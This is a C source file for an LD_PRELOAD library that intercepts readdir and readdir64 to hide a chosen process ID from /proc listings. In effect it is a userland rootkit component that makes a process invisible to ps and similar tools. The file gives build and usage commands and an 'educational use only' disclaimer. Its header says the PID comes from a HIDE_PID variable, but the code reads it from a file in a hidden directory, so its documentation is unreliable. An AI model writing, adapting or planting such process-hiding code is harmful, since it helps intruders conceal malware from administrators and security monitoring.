#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

typedef struct dirent dirent_t;
typedef struct dirent64 dirent64_t;

/*
 * LD_PRELOAD library that intercepts readdir/readdir64 and hides entries when
 * listing /proc. Configuration:
 *   HIDE_PID  - string of PID to hide (e.g. "1234")
 *
 * Build:
 *   gcc -shared -fPIC -o libhideproc.so hideproc.c -ldl
 *
 * Usage (experiment in an isolated VM):
 *   LD_PRELOAD=./libhideproc.so ps aux
 *
 * NOTE: for educational use only. Do not run on systems you don't own.
 */

// helper function that gets the process PID from the temp file
static char* get_process_pid() {
    char *file_name = "/home/houd4aif4/.temp/.hidden/.process/.pid.txt"; 
    FILE *f = fopen(file_name, "r");

    if (!f) {
        perror("fopen");
        return NULL;
    }

    char buf[64];
    if (fgets(buf, sizeof(buf), f) == NULL) {
        if (ferror(f)) perror("fgets");
        fclose(f);
        return NULL;
    }
    fclose(f);

    size_t ln = strlen(buf);
    if (ln && buf[ln-1] == '\n') buf[ln-1] = '\0';

    char *out = strdup(buf);
    if (!out) {
        perror("strdup");
        return NULL;
    }

    return out;
}

static dirent_t *(*real_readdir)(DIR *) = NULL;
static dirent64_t *(*real_readdir64)(DIR *) = NULL;

static char hide_pid[64] = {0};
static int initialized = 0;

static void init_once(void) {
    if (initialized) return;
    initialized = 1;

    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    char *hp = get_process_pid();
    if (hp && *hp && strlen(hp) < sizeof(hide_pid))
        strcpy(hide_pid, hp);
}

/* Helper: get path of DIR* via /proc/self/fd/<fd> */
static int get_dirpath_from_dirp(DIR *dirp, char *out, size_t out_sz) {
    int fd = dirfd(dirp);
    if (fd == -1) return -1;
    char linkpath[64];
    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", fd);
    ssize_t r = readlink(linkpath, out, out_sz - 1);
    if (r <= 0) return -1;
    out[r] = '\0';
    return 0;
}

/* Check whether dirp is /proc (or a path that ends with "/proc") */
static int dirp_is_proc(DIR *dirp) {
    char path[PATH_MAX];
    if (get_dirpath_from_dirp(dirp, path, sizeof(path)) != 0) return 0;
    /* Some tools can open "/proc" or "/proc/" or mount variants. Check basename. */
    const char *p = strrchr(path, '/');
    if (!p) p = path;
    else p++;
    return (strcmp(p, "proc") == 0);
}

/* Helper: check whether an entry should be hidden. */
static int should_hide(const char *d_name) {
    if (hide_pid[0] && strcmp(d_name, hide_pid) == 0) return 1;

    return 0;
}

/* Common loop: call real_readdir until a non-hidden entry or NULL */
static dirent_t *readdir_filtered(DIR *dirp) {
    init_once();
    if (!real_readdir) return NULL;

    /* If not reading /proc, return normal behavior quickly */
    if (!dirp_is_proc(dirp)) {
        return real_readdir(dirp);
    }

    dirent_t *d;
    while ((d = real_readdir(dirp)) != NULL) {
        if (!should_hide(d->d_name)) return d;
        /* else skip and continue */
    }
    return NULL;
}

/* 64-bit variant */
static dirent64_t *readdir64_filtered(DIR *dirp) {
    init_once();
    if (!real_readdir64) return NULL;

    if (!dirp_is_proc(dirp)) {
        return real_readdir64(dirp);
    }

    dirent64_t *d;
    while ((d = real_readdir64(dirp)) != NULL) {
        if (!should_hide(d->d_name)) return d;
    }
    return NULL;
}

/* Exported symbols */
dirent_t *readdir(DIR *dirp) {
    return readdir_filtered(dirp);
}

dirent64_t *readdir64(DIR *dirp) {
    return readdir64_filtered(dirp);
}
